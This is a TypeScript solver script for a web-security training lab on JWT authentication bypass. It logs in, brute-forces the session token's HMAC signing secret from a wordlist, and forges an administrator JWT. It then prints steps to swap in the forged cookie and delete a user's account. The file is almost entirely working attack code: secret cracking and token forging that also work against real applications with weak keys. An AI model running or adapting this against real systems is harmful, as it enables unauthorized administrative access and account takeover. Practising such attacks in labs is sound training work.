import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { extractCsrfToken } from "../../../utils/extractCsrfToken.js";
import { myCredentials } from "../../../config/credentials.js";
import { extractCookie } from "../../../utils/extractCookie.js";
import { createHmac } from "node:crypto";
import { getJwtSecrets } from "../../../config/getJwtSecrets.js";

const { labUrl, httpClient } = getParsedInputFromUser({
  description: "Lab: JWT authentication bypass via weak signing key",
  proxy: true,
});

runTasks([task]);

async function task() {
  const signedJwt = await getSignedJwt();
  console.log("start brute-forcing JWT secrets...");
  const secret = await bruteForceJwtSecret(signedJwt);
  // TODO: create utility for creating base64Url JWT based on JS objects or base64Url string/or even create JWT class
  const adminJwt = createAdminJwt(secret);
  console.log("found secret: " + secret);
  console.log(`
To solve the lab:
  1. Edit your browser cookie for the lab site with key "session" and value "${adminJwt}"
  2. Go to admin page:
  "${labUrl}admin"
  3. Delete carlos's account
`);
}

async function getSignedJwt() {
  const sessionCookie = await getSessionCookie();
  return sessionCookie.value;
}

async function getSessionCookie() {
  const csrf = await getCsrfToken();
  const loginResponse = await httpClient.post(
    labUrl + "login",
    new URLSearchParams({
      csrf,
      username: myCredentials.username,
      password: myCredentials.password,
    }),
  );
  return extractCookie(loginResponse, "session");
}

async function getCsrfToken() {
  const loginResponse = await httpClient.get(labUrl + "login");
  return extractCsrfToken(loginResponse.data);
}

async function bruteForceJwtSecret(signedJwt: string) {
  const [header, payload, signature] = signedJwt.split(".");
  const unsignedJwt = [header, payload].join(".");
  for (const secret of await getJwtSecrets()) {
    const signatureToTest = createHmac("sha256", secret)
      .update(unsignedJwt)
      .digest("base64url");
    if (signatureToTest === signature) {
      return secret;
    }
  }
  throw new Error("No matching JWT secret found.");
}

function createAdminJwt(secret: string) {
  const header = Buffer.from(JSON.stringify({ alg: "HS256" })).toString(
    "base64url",
  );
  const payload = Buffer.from(
    JSON.stringify({ sub: "administrator" }),
  ).toString("base64url");
  const signature = createHmac("sha256", secret)
    .update([header, payload].join("."))
    .digest("base64url");
  return [header, payload, signature].join(".");
}
